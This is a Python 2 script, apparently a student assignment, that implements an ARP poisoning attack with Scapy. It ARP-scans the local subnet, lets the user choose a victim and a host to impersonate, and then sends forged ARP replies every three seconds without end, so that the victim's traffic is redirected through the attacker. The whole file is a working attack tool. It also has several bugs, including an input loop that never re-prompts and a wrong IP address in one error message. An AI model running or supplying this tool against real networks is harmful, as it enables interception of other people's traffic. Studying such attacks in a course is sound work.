#ARP poisoning tool
#Ivo Geenen, 1007502
#Jeroen Kivits, 1011599


#import statements
from scapy.config import conf
#disable ipv6
conf.ipv6_enabled = False
from scapy.all import *
import netifaces
import time

def main():
    print 'ARP Poisoning program.\n'

    interfaceList = netifaces.interfaces()

    #Print the available interfaces in a table
    print 'Interfaces found:'
    interfaceTable = "{0:3}|{1:18}"
    print interfaceTable.format('ID', 'Interface')
    print interfaceTable.format('---', '------------------')
    for interface in range(len(interfaceList)):
        print interfaceTable.format(str(interface), interfaceList[interface])

    #Let the User choose one of the interfaces of the table
    interfaceChoice = input('\nPlease choose an interface to perform the ARP poisoning attack by entering the corresponding ID.\n')
    while True:
        #ID is within bounds
        if 0 <= interfaceChoice < len(interfaceList):
            interface = interfaceList[interfaceChoice]
            break
        #ID is out of bounds
        else:
            print 'Invalid ID. Please enter a valid one.'

    #Get the ip address of the attacker
    ipAttacker = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    #Get the mac address of the attacker
    macAttacker = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
    #Get the subnetmask
    subnetMask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask'];


    while True:
        inputChoice = input('\nEnter (0) to select a victim and an IP to spoof from a list or enter (1) to provide the victim and the IP to spoof manually.\n')

        if inputChoice == 0:

            #Convert ipv4 to binary
            decSplit = ipAttacker.split('.')
            binSplit = []
            for i in range(len(decSplit)):
                binSplit.append('{0:08b}'.format(int(decSplit[i])))
            convertedIP = ''.join(binSplit)

            #Convert ipv4 to binary
            decSplit = subnetMask.split('.')
            binSplit = []
            for i in range(len(decSplit)):
                binSplit.append('{0:08b}'.format(int(decSplit[i])))
            convertedSubnetMask = ''.join(binSplit)

            #Compute the binary subnet prefix with the IP of the attacker and the subnet mask
            subnetMaskCounter = 0
            #Loop through every bit of the converted subnet mask
            for i in convertedSubnetMask:
                if i == '1':
                    subnetMaskCounter = subnetMaskCounter + 1
                elif i == '0':
                    break

            binaryPrefix = convertedIP[:subnetMaskCounter]
            suffixLen = 32 - len(binaryPrefix)
            suffixes = []

            for suffix in range(2 ** suffixLen):
                binarySuffix = "{0:08b}".format(suffix)
                suffixes.append(binarySuffix)

            suffixes.remove(convertedIP[len(binaryPrefix):])

            activeHostList = []

            print '\nPlease wait while scanning the subnet for active hosts.'

            #Send an ARP packet for every possible IP in the subnet (except for our own IP)
            for IP in range(len(suffixes)):
                suffix = suffixes[IP]


                #Transform the binary string to ipv4
                hostIP = ""
                binSplit = re.findall('........', (binaryPrefix + suffix))
                decSplit = []

                for i in binSplit:
                    decSplit.append(str(int(i,2)))
                hostIP = '.'.join(decSplit)

                arpFrame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=hostIP)
                answer = srp1(arpFrame, iface=interface, verbose=0, timeout=0.001)

                if not answer is None:
                    #Save IP and MAC if response received
                    activeHostList.append([answer.psrc, answer.hwsrc])

            print 'Scanning done.'


            if (len(activeHostList) >= 2):
                hostTable = "{0:3}|{1:16}|{2:16}"

                print '\nActive hosts:'

                print hostTable.format('ID', 'Host IP', 'Host MAC')
                print hostTable.format('---', '----------------', '----------------')

                for i in range(len(activeHostList)):

                    print hostTable.format(str(i), activeHostList[i][0], activeHostList[i][1])

                #Ask user for victim to poison and IP address to spoof
                while (True):
                    chosenVictim = input('\nChoose a victim by entering its corresponding ID.\n')

                    #Check if choses ID is within bounds.
                    if not (0 <= chosenVictim < len(activeHostList)):
                        print 'Chosen ID is out of bounds. Please enter a valid one.'
                        continue
                    else: #Valid choice
                        chosenSpoof = input('\nChoose a host to spoof by entering its corresponding ID.\n')

                        if (0 <= chosenSpoof < len(activeHostList)):
                            if chosenSpoof == chosenVictim:
                                print 'Victim IP and spoof IP are the same. Please enter differrent ones.'
                            else:
                                victimIP = activeHostList[chosenVictim][0]
                                victimMAC = activeHostList[chosenVictim][1]
                                spoofIP = activeHostList[chosenSpoof][0]
                                victim = [victimIP, victimMAC, spoofIP]
                        else:
                            print 'Chosen ID is out of bounds. Please enter a valid one'
                    break

            else:
                print 'Less than 2 active hosts. Please try again later.'
                exit(0)
            break

        elif inputChoice == 1:
            selection = True

            while True:
                victimIP = raw_input('\nPlease enter the IP address of the victim:\n')

                spoofIP = raw_input('\nPlease enter the IP address of the host you wish to spoof:\n')

                if victimIP == spoofIP:
                    print 'Victim IP and spoof IP are the same. Please enter differrent ones.'
                    continue

                #Determine whether the victim is active or not
                activeVictim = [victimIP]

                arpFrame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=victimIP)

                for i in range(10):
                    answer = srp1(arpFrame, iface=interface, verbose=0, timeout=0.001)

                    #If response received, host is active, so store IP and MAC
                    if answer is not None:
                        print answer.psrc + ' is active.\n'
                        if answer.psrc == victimIP:
                            victimMAC = answer.hwsrc
                            break
                    if i == 9:
                        print '\n' + victimIP + ' is not active. Try again.'
                        activeVictim = False

                if activeVictim == False:
                    continue;

                #Determine whether the spoof is active or not
                activeSpoof = [spoofIP]

                arpFrame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=spoofIP)

                for i in range(10):
                    answer = srp1(arpFrame, iface=interface, verbose=0, timeout=0.001)

                    #If response received, host is active, so store IP and MAC
                    if answer is not None:
                        print answer.psrc + ' is active.\n'
                        break
                    if i == 9:
                        print '\n' + victimIP + ' is not active. Try again.'
                        activeSpoof = False

                if activeSpoof == False:
                    continue;

                victim = [victimIP, victimMAC, spoofIP]
                break
            break

    while True:
        start = input('\nEnter (0) to start the ARP poisoning\n')
        if start == 0:
            #Start persistantly poisoning the victim
            print '\nARP poisoning attack started'
            print 'Kill this process to stop the program.'
            while True:
                arp= Ether() / ARP()
                arp[Ether].src = macAttacker
                arp[ARP].hwsrc = macAttacker
                arp[ARP].psrc = victim[2]
                arp[ARP].hwdst = victim[1]
                arp[ARP].pdst = victim[0]

                sendp(arp, iface=interface)
                time.sleep(3)

main()
